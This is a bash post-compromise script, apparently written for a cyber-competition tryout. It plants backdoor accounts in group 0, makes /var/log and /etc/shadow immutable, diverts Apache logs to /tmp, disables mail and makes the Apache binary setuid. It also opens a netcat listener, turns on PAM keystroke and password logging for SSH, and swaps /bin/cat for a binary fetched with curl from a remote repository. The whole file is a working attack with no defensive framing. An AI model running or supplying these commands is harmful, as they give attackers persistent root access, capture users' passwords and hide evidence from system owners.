#!/bin/bash
#Add new accounts to shadow
useradd imposter -g 0 -p admin -r -s /bin/bash
useradd impasta2 -g 0 -p admin -s /bin/sh
useradd iaminsideyourwalls -g 1 -p admin -s /bin/csh
useradd l33th4x0r -g 0 -p hax -s /bin/sh
#Make /var/log and /etc/passwd readonly :)
chattr -R +i /var/log
chattr +i /etc/shadow
#Force webserver to log to tmp and mess with error logging :)
sed -i 's/ErrorLog \${APACHE_LOG_DIR}\/error\.log/ErrorLog \/tmp\/hahawrongdir.log/' /etc/apache2/apache2.conf
sed -i 's/export APACHE_LOG_DIR=\/var\/log\/apache2\$SUFFIX/export APACHE_LOG_DIR=\/tmp\$SUFFIX/' /etc/apache2/envvars
echo "CustomLog /tmp/trolled.log common" >> /etc/apache2/apache2.conf
systemctl restart apache2
#Disable mail
systemctl stop postfix
systemctl disable postfix
#Make apache2 instance run as root :D
chmod u+s /usr/sbin/apache2
#Install reverse shell
nc -lvp 1337 &
#Install keylogger
cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
#Install auditd to make sure this works
apt install -y auditd
systemctl enable auditd
echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" > /etc/pam.d/sshd
systemctl restart sshd
systemctl restart auditd
#Pull modded cat and swap :)
#Modded cat will append to a file in cyberpup_admin called always_watching.txt
#Place /usr/bin/keybak so that cat can restore keys
mv /bin/cat /bin/dog
cp /home/cyberpup_admin/.ssh/authorized_keys /usr/bin/keybak
sudo curl https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/sick-cat --output /bin/cat
chmod +x /bin/cat
#Clear history, leave no trace
#history -c
